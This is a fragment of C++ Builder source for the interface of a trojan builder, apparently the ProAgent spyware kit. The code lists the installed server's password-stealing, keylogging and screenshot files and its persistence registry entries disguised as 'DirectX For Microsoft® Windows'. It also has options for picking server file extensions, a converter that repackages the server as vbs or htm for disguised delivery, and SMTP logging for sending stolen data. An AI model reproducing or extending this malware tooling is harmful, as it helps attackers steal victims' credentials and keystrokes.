void __fastcall TForm1::Label3MouseMove(TObject *Sender, TShiftState Shift,
      int X, int Y)
{
suiMemo1->Text="Interval(delay) in seconds between data sending retries.";
}
//---------------------------------------------------------------------------


void __fastcall TForm1::suiButton7Click(TObject *Sender)
{
char pathkey[100];
char pathkey2[100];
GetWindowsDirectory( pathkey, 100 );
GetSystemDirectory( pathkey2, 100 );
strcat(pathkey,"\\");
strcat(pathkey2,"\\");
AnsiString fps,fps3,mps,mps3,icq,iss32,iss,keyexe,keydll,keyreg,keylog,Ss,Kopya1;
fps=AnsiString(pathkey)+"fps.exe";//exe kaydetmek icin
fps3=AnsiString(pathkey)+"fps.atm";//sifre dosyasi
mps=AnsiString(pathkey)+"mps.exe";//exe kaydetmek icin
mps3=AnsiString(pathkey)+"mps.atm";//sifre dosyasi
icq=AnsiString(pathkey)+"icq.dll";   //ICQ 2003a sifrelerinin alinmasi icin gerekli olan dll
iss32=AnsiString(pathkey)+"iss32.exe"; //ras sifreleri icin
iss=AnsiString(pathkey2)+"iss.atm"; //ras sifreleri icin
keyexe=AnsiString(pathkey)+"CRSS.EXE";  //keylogger icin
keydll=AnsiString(pathkey)+"kdd32.atm"; //keylogger icin
keyreg=AnsiString(pathkey)+"kt.atm";    //keylogger icin
keylog=AnsiString(pathkey)+"ktd32.atm"; //keylogger icin
Ss=AnsiString(pathkey2)+"ekran_g.jpg";  //Ekran goruntusu
Kopya1=AnsiString(pathkey2)+"\\dtxservice.exe";
if(FileExists(fps) || FileExists(fps3) || FileExists(mps) || FileExists(mps3) || FileExists(icq) || FileExists(iss32) || FileExists(iss) || FileExists(keyexe) || FileExists(keydll) || FileExists(keyreg) || FileExists(keylog) || FileExists(Ss) || FileExists(Kopya1)  )
  {//Bulasmis oldugu anlasildi.
     kill(Kopya1);
     kill(iss32);
     kill(keyexe);
     //==========================================================
     TRegistry& regKey = *new TRegistry();
     regKey.RootKey= HKEY_LOCAL_MACHINE;
     regKey.OpenKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run\\",false);
     regKey.DeleteValue("DirectX For Microsoft® Windows");
     regKey.CloseKey();
     regKey.OpenKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",false);
     regKey.DeleteValue("DirectX For Microsoft® Windows");
     regKey.CloseKey();
     //==========================================================
     Sleep(2000);
     DeleteFile(fps);    DeleteFile(fps3);
     DeleteFile(mps);    DeleteFile(mps3);
     DeleteFile(icq);    DeleteFile(iss32);
     DeleteFile(iss);    DeleteFile(keyexe);
     DeleteFile(keydll); DeleteFile(keyreg);
     DeleteFile(keylog); DeleteFile(Ss);
     DeleteFile(Kopya1);
     kill(Kopya1); //tekrarlaniyor
     DeleteFile(Kopya1);  //tekrarlaniyor
     suiMessageDialog1->Text="Server removed successfully.";
     suiMessageDialog1->IconType=suiInformation;
     suiMessageDialog1->ShowModal();
     return;
  }
   else
       {
         suiMessageDialog1->Text="You are not infected with proagent server.";
         suiMessageDialog1->IconType=suiInformation;
         suiMessageDialog1->ShowModal();
         return;
       }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton10Click(TObject *Sender)
{
Form5->ShowModal();      
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton8Click(TObject *Sender)
{
Form7->ShowModal();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Exit1Click(TObject *Sender)
{
exit(1);        
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiRadioButton1MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="You can choose 7 different extensions for the server.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiRadioButton2MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="You can choose 7 different extensions for the server.";        
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiRadioButton3MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="You can choose 7 different extensions for the server.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiRadioButton4MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="You can choose 7 different extensions for the server.";
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiRadioButton5MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="You can choose 7 different extensions for the server.";        
}
//---------------------------------------------------------------------------



void __fastcall TForm1::suiButton11Click(TObject *Sender)
{
GetTempPath(128, Temp);
exe2vbs=AnsiString(Temp)+"vbs2htm.exe";
if(!FileExists(exe2vbs))
rc4->SaveToFile(exe2vbs);
exe2vbs=exe2vbs+" Atmaca";
WinExec(exe2vbs.c_str(), SW_SHOW);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::suiButton11MouseMove(TObject *Sender,
      TShiftState Shift, int X, int Y)
{
suiMemo1->Text="You can use this tool to convert server extensions to vbs or htm.But first you have to create a server.exe.";        
}
//---------------------------------------------------------------------------


void __fastcall TForm1::NMSMTP1PITrail(TObject *Sender, int ErrorCode,
      AnsiString &Description)
{
Form6->suiMemo1->Lines->Add(Description);
}
//---------------------------------------------------------------------------

